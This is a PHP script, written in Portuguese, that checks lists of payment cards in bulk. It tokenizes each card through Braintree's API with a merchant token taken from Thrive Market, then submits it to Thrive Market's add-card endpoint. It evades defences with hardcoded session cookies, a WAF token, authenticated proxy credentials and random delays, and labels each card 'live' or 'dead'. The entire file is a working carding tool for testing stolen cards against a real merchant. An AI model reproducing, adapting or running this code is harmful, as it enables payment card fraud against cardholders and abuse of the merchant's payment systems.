<?php
error_reporting(0);
set_time_limit(0);

$delay = rand(20, 40);
sleep($delay);

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die('<span class="text-danger">❌ REPROVADA</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida</span> ➔ <span class="text-warning">$cybersecofc</span><br>');
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

if (strlen($ano) < 4) {
    $ano = "20" . $ano;
}

function detectarBandeira($cc) {
    $bandeiras = [
        'Visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'Mastercard' => '/^(5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
        'Elo' => '/^(401178|401179|431274|438935|451416|457393|4576|457630|457631|457632|504175|506699|50670[0-9]{2}|50671[0-9]{2}|50672[0-9]{2}|50673[0-9]{2}|50674[0-9]{2}|50675[0-9]{2}|50676[0-9]{2}|50677[0-9]{2}|50678[0-9]{2}|50679[0-9]{2}|509000|627780|636297|636368)[0-9]{10,12}$/',
        'Hipercard' => '/^(606282|3841)[0-9]{10,15}$/',
        'Amex' => '/^3[47][0-9]{13}$/',
        'Diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'Discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'JCB' => '/^(?:2131|1800|35\d{3})\d{11}$/'
    ];

    foreach ($bandeiras as $bandeira => $pattern) {
        if (preg_match($pattern, $cc)) {
            return $bandeira;
        }
    }
    return 'Desconhecida';
}

$inicio = microtime(true);
$bandeira = detectarBandeira($cc);

// Proxy configuration
$proxys = [
    [
        'ip' => 'gw.aproxy.com',
        'porta' => '2312',
        'user' => 'ap-nherz7p2v4xm',
        'pass' => 'G6hlGv7cZVU5Csvv',
        'pais' => 'Proxy',
        'cidade' => 'Server'
    ]
];

$proxy = $proxys[array_rand($proxys)];
$proxyInfo = $proxy['pais'] . ' - ' . $proxy['cidade'];

// Gerar sessionId único
$sessionId = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

// ========== PRIMEIRA REQUISIÇÃO - Braintree Tokenize ==========
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['porta']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: payments.braintree-api.com',
    'sec-ch-ua-platform: "Windows"',
    'authorization: Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzE2OTUwNjcsImp0aSI6IjAyZmNiZjQ1LTlhNjUtNDljZS1hOWU1LWQ5YjdhZDQ0ZWYwZSIsInN1YiI6IjN6bnRmNGI0bnY5bWhycmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjN6bnRmNGI0bnY5bWhycmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFWdkZsM1k1dGtKdUNaOXpveG5vRHVSaXlVWXltZFEtMks5RGplTjczUHpmOTNjamZ6STNlMTdsT1l1TFdYTzI4RzZpZzdaRjhJWUZZVVdjIn19.Uf034PJDy-TE00EyO22UMdYpK847fh8p76U401OmV08GprXmkS2E85ReALKSLgmGg7ujc9CLghu58g6AV-e_zg',
    'braintree-version: 2018-05-10',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'content-type: application/json',
    'sec-ch-ua-mobile: ?0',
    'accept: */*',
    'origin: https://thrivemarket.com',
    'sec-fetch-site: cross-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://thrivemarket.com/',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i'
]);

$graphql_query = json_encode([
    'clientSdkMetadata' => [
        'source' => 'client',
        'integration' => 'custom',
        'sessionId' => $sessionId
    ],
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
    'variables' => [
        'input' => [
            'creditCard' => [
                'number' => $cc,
                'expirationMonth' => str_pad($mes, 2, '0', STR_PAD_LEFT),
                'expirationYear' => $ano,
                'cvv' => $cvv,
                'billingAddress' => [
                    'postalCode' => '10001'
                ]
            ],
            'options' => [
                'validate' => true
            ]
        ]
    ],
    'operationName' => 'TokenizeCreditCard'
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $graphql_query);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$response1 = curl_exec($ch);
$httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Fallback sem proxy se falhar
if ($httpCode1 != 200 || !$response1) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: payments.braintree-api.com',
        'authorization: Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzE2OTUwNjcsImp0aSI6IjAyZmNiZjQ1LTlhNjUtNDljZS1hOWU1LWQ5YjdhZDQ0ZWYwZSIsInN1YiI6IjN6bnRmNGI0bnY5bWhycmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjN6bnRmNGI0bnY5bWhycmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFWdkZsM1k1dGtKdUNaOXpveG5vRHVSaXlVWXltZFEtMks5RGplTjczUHpmOTNjamZ6STNlMTdsT1l1TFdYTzI4RzZpZzdaRjhJWUZZVVdjIn19.Uf034PJDy-TE00EyO22UMdYpK847fh8p76U401OmV08GprXmkS2E85ReALKSLgmGg7ujc9CLghu58g6AV-e_zg',
        'braintree-version: 2018-05-10',
        'content-type: application/json'
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $graphql_query);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    $response1 = curl_exec($ch);
    $httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

$resposta1 = json_decode($response1, true);

// Verificar se conseguiu tokenizar
if (!isset($resposta1['data']['tokenizeCreditCard']['token'])) {
    $errorMsg = 'Erro ao tokenizar cartão';
    if (isset($resposta1['errors'][0]['message'])) {
        $errorMsg = $resposta1['errors'][0]['message'];
    }
    die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Braintree: ' . $errorMsg . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.number_format(microtime(true)-$inicio,2).'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

$paymentToken = $resposta1['data']['tokenizeCreditCard']['token'];

// Extrair cookies da primeira requisição (se precisar)
$cookies = [
    'thrv_opt_uuid=mage_64b44c88eb2c10t5MqsHFt',
    'segmentation_customer_group=1',
    'ccode=newmember30off',
    'TinuitiFPC=be11eaae-8210-47f0-a54f-43daeca2bd0d',
    '_gid=GA1.2.855444053.1771608659',
    'registered_user=33107795',
    'just-registered=1',
    'frontend=aa4627248a954c02d85a05b81b080d72',
    'persistent_shopping_cart=ck1xwPR1jtC7cmksBjlHCVgFzkqoHsNKGAGaWa74IBCVzcoaeI',
    'just-loggedin=1',
    'loggedin=1',
    'assigned_warehouses=2%2C5%2C10',
    'aws-waf-token=2b24651e-0e3b-4c6a-acb5-25740b3786f8:EAoAdAh6jyBQAAAA:DtuLI+fIHEwF5x7hmvQkjBX5G8NWCA3pwODuiz6hr5gBitY2dwq6Ifd5KgNRTBmemLPdtMh+K07cTyJtiQ6akf++vakUQTh8g2GPhbBIx6mZPW7XJ4PoRFvlnTc9wqDFhnQH4H4TC8yCvR9+R/C1tC/INMg52VD9hDUXYJp8TsEDx7VuDA5LdgxSECHVHaVNUTZ79hEO3jF5yqBZ7i97J90=',
    'previous_location=https://thrivemarket.com/membership/payment/method',
    '__attentive_pv=8',
    'neo_session=NeotagEncrypt%3AU2FsdGVkX186QVG7umyxV35q41LnI7OLuvfjPxqAxFQ%2FGKm6sry61hdNpWRlitW6Vw85CjZIn0h7jdH%2BNVXCLG8QEQM1tSNUAV6Qtd9yx8eO6zZZT3oI3FbWlsmXnItYLvam%2BhvSKsXhTPAQPYx5kQ%3D%3D'
];

$cookie_string = implode('; ', $cookies);

// Gerar token aleatório para a Thrive (formato baseado no exemplo)
function generateThriveToken() {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_';
    $token = '';
    for ($i = 0; $i < 32; $i++) {
        $token .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    return $token;
}

// Gerar newrelic header dinâmico
$newrelic = json_encode([
    [0, 1],
    [
        'ty' => 'Browser',
        'ac' => '2649932',
        'ap' => '594416819',
        'id' => sprintf('%04x%04x%04x%04x', mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)),
        'tr' => sprintf('%04x%04x%04x%04x%04x%04x%04x%04x', 
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)),
        'ti' => time() . mt_rand(100, 999)
    ]
]);

$newrelic_header = base64_encode($newrelic);

// ========== SEGUNDA REQUISIÇÃO - ThriveMarket Add Card ==========
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thrivemarket.com/api/v1/account/cc?all=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['porta']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: thrivemarket.com',
    'Cookie: ' . $cookie_string,
    'x-newrelic-id: VgADWF9QChACXFRRBQEAVlE=',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'reqsource: web',
    'newrelic: ' . $newrelic_header,
    'sec-ch-ua-mobile: ?0',
    'x-aws-waf-token: 2b24651e-0e3b-4c6a-acb5-25740b3786f8:EAoAdAh6jyBQAAAA:DtuLI+fIHEwF5x7hmvQkjBX5G8NWCA3pwODuiz6hr5gBitY2dwq6Ifd5KgNRTBmemLPdtMh+K07cTyJtiQ6akf++vakUQTh8g2GPhbBIx6mZPW7XJ4PoRFvlnTc9wqDFhnQH4H4TC8yCvR9+R/C1tC/INMg52VD9hDUXYJp8TsEDx7VuDA5LdgxSECHVHaVNUTZ79hEO3jF5yqBZ7i97J90=',
    'traceparent: 00-' . sprintf('%04x%04x%04x%04x%04x%04x%04x%04x', 
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)) . '-' . 
        sprintf('%04x%04x%04x%04x', mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)) . '-01',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'accept: application/json, text/plain, */*',
    'content-type: application/json',
    'tracestate: 2649932@nr=0-1-2649932-594416819-' . sprintf('%04x%04x%04x%04x', mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)) . '----' . time() . mt_rand(100, 999),
    'origin: https://thrivemarket.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://thrivemarket.com/membership/payment/method',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i'
]);

$thrive_token = generateThriveToken();
$postFields2 = json_encode([
    'payment_method_nonce' => $paymentToken,
    'make_default' => true,
    'token' => $thrive_token,
    'is_checkout' => true
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields2);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$response2 = curl_exec($ch);
$httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$fim = microtime(true);
$tempoFormatado = number_format($fim - $inicio, 2);

// Fallback sem proxy
if ($httpCode2 != 200 || !$response2) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://thrivemarket.com/api/v1/account/cc?all=1');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: thrivemarket.com',
        'Cookie: ' . $cookie_string,
        'x-newrelic-id: VgADWF9QChACXFRRBQEAVlE=',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'reqsource: web',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
        'accept: application/json',
        'content-type: application/json',
        'origin: https://thrivemarket.com',
        'referer: https://thrivemarket.com/membership/payment/method',
        'accept-language: pt-BR,pt;q=0.9'
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields2);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    $response2 = curl_exec($ch);
    $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

$respostaJson = json_decode($response2, true);

// Processar resposta da Thrive
if ($respostaJson === null) {
    // Verificar se é HTML de erro
    if (strpos($response2, 'cf-wrapper') !== false || strpos($response2, 'cloudflare') !== false) {
        die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Bloqueado por Cloudflare</span> ➔ <span class="badge badge-info">HTTP: '.$httpCode2.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
    }
    die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Resposta inválida</span> ➔ <span class="badge badge-info">HTTP: '.$httpCode2.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

// Extrair mensagem de erro
$mensagem = '';
if (isset($respostaJson['errors'])) {
    $mensagem = is_array($respostaJson['errors']) ? implode(' ', $respostaJson['errors']) : $respostaJson['errors'];
} elseif (isset($respostaJson['error'])) {
    $mensagem = is_array($respostaJson['error']) ? json_encode($respostaJson['error']) : $respostaJson['error'];
} elseif (isset($respostaJson['message'])) {
    $mensagem = $respostaJson['message'];
}

// ========== ANÁLISE DOS RESULTADOS ==========

// CVV INCORRETO - LIVE
if (stripos($mensagem, 'CVV') !== false && 
    (stripos($mensagem, 'incorrect') !== false || stripos($mensagem, 'invalid') !== false)) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - CVV Incorreto)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 ' . $mensagem . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

// 3DS / VBV
if (stripos($mensagem, '3D Secure') !== false || 
    stripos($mensagem, 'authentication') !== false ||
    stripos($mensagem, 'verify') !== false ||
    stripos($mensagem, 'contact your bank') !== false) {
    die('<span class="badge badge-warning">❌ REPROVADA / .</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-warning">❌ ' . $mensagem . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

// FUNDOS INSUFICIENTES - LIVE
if (stripos($mensagem, 'insufficient funds') !== false || 
    stripos($mensagem, 'insufficient_funds') !== false) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - Saldo Insuficiente)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 ' . $mensagem . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

// CARTÃO EXPIRADO - DIE
if (stripos($mensagem, 'expired') !== false) {
    die('<span class="badge badge-danger">❌ REPROVADA (Cartão Expirado)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">📅 ' . $mensagem . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

// SE CHEGOU AQUI, MOSTRA A MENSAGEM ORIGINAL
$motivo = !empty($mensagem) ? $mensagem : 'Negado - HTTP ' . $httpCode2;
if (strlen($motivo) > 100) {
    $motivo = substr($motivo, 0, 100) . '...';
}

die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">' . $motivo . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
?>
